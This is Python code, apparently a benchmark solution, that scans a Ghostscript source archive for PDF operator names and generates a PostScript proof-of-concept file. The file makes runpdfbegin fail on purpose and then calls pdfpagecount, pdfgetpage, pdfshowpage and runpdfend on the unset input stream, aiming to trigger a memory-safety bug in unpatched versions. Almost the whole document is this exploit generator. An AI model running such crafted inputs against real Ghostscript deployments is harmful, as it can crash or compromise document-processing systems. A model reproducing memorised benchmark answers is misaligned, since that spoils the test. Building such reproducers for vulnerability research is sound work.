import os
import tarfile
import tempfile
import re


class Solution:
    def _extract_operator_names(self, src_path):
        ops = set()
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name_lower = m.name.lower()
                    if not (name_lower.endswith('.c') or name_lower.endswith('.h') or name_lower.endswith('.ps')):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        try:
                            s = data.decode('utf-8', errors='ignore')
                        except Exception:
                            s = data.decode('latin1', errors='ignore')
                    except Exception:
                        continue

                    # Parse operator definitions of Ghostscript style: {"1runpdfbegin", zrunpdfbegin},
                    for g in re.finditer(r'\{\s*"([^"]+)"\s*,\s*z[a-zA-Z0-9_]+\s*\}', s):
                        raw = g.group(1)
                        if 'pdf' in raw:
                            # Strip leading arity like "1" or "1." or "."
                            op = raw
                            # Remove leading digits and optional dot
                            m2 = re.match(r'^[0-9]*\.?(.*)$', op)
                            if m2:
                                op = m2.group(1)
                            if op:
                                ops.add(op)
                    # Also collect any PostScript-level definitions mentioning pdf operators
                    for g in re.finditer(r'/(runpdfbegin|runpdfend|pdfpagecount|pdfgetpage|pdfshowpage)\b', s):
                        ops.add(g.group(1))
        except Exception:
            pass
        return ops

    def _build_ps(self, ops):
        # Create a PostScript program that attempts multiple sequences to trigger the bug while
        # catching errors so fixed versions exit cleanly.
        # We probe known operators and execute guarded sequences.
        lines = []

        # Utility: safe call wrapper via stopped
        lines.append("%!PS-Adobe-3.0")
        lines.append("/SAFE { { exec } stopped pop } bind def")
        # helper to check operator existence in systemdict
        def if_known(op, body_lines):
            lines.append(f"systemdict /{op} known {{")
            lines.extend(body_lines)
            lines.append("} if")

        # Attempt 1: runpdfbegin fails, then other PDF ops that access the input stream
        if 'runpdfbegin' in ops:
            # Provide multiple invalid invocations to try to reach the failing path
            seq = []
            # Pass wrong type (dict) -> typecheck (caught)
            seq.append("{ 10 dict runpdfbegin } stopped pop")
            # Pass bogus filename -> undefinedfilename (caught)
            seq.append("{ (%%nonexistent%%/nope.pdf) runpdfbegin } stopped pop")
            # Pass a (closed) file object instead of string (caught)
            seq.append("{ (%stdin) (r) file dup closefile runpdfbegin } stopped pop")
            # Now call various PDF operators that could touch the (unset) input stream
            if 'pdfpagecount' in ops:
                seq.append("{ pdfpagecount pop } stopped pop")
            if 'pdfgetpage' in ops:
                # try a couple of page numbers
                seq.append("{ 1 pdfgetpage pop } stopped pop")
                seq.append("{ 0 pdfgetpage pop } stopped pop")
            if 'pdfshowpage' in ops:
                seq.append("{ 1 pdfshowpage } stopped pop")
                seq.append("{ 0 pdfshowpage } stopped pop")
            if 'runpdfend' in ops:
                seq.append("{ runpdfend } stopped pop")
            if_known('runpdfbegin', seq)

        # Attempt 2: If there's a direct pagecount operator, call it without initialization
        if 'pdfpagecount' in ops:
            if_known('pdfpagecount', [
                "{ pdfpagecount pop } stopped pop"
            ])

        # Attempt 3: call getpage/showpage without begin
        if 'pdfgetpage' in ops:
            if_known('pdfgetpage', [
                "{ 1 pdfgetpage pop } stopped pop",
                "{ 42 pdfgetpage pop } stopped pop",
            ])
        if 'pdfshowpage' in ops:
            if_known('pdfshowpage', [
                "{ 1 pdfshowpage } stopped pop",
                "{ 2 pdfshowpage } stopped pop",
            ])

        # Attempt 4: Try a few repeated sequences to increase odds
        lines.append("0 1 3 {")
        if 'runpdfbegin' in ops:
            lines.append("  { (no-such.pdf) runpdfbegin } stopped pop")
        if 'pdfpagecount' in ops:
            lines.append("  { pdfpagecount pop } stopped pop")
        if 'pdfgetpage' in ops:
            lines.append("  { 1 pdfgetpage pop } stopped pop")
        if 'pdfshowpage' in ops:
            lines.append("  { 1 pdfshowpage } stopped pop")
        if 'runpdfend' in ops:
            lines.append("  { runpdfend } stopped pop")
        lines.append("} for")

        # Final cleanup and graceful exit
        lines.append("cleardictstack")
        lines.append("clear")
        lines.append("quit")
        return ("\n".join(lines) + "\n").encode('latin1')

    def solve(self, src_path: str) -> bytes:
        ops = self._extract_operator_names(src_path)
        # If no operators detected, still craft a generic PostScript attempting known names.
        if not ops:
            ops = {
                'runpdfbegin', 'runpdfend', 'pdfpagecount', 'pdfgetpage', 'pdfshowpage'
            }
        return self._build_ps(ops)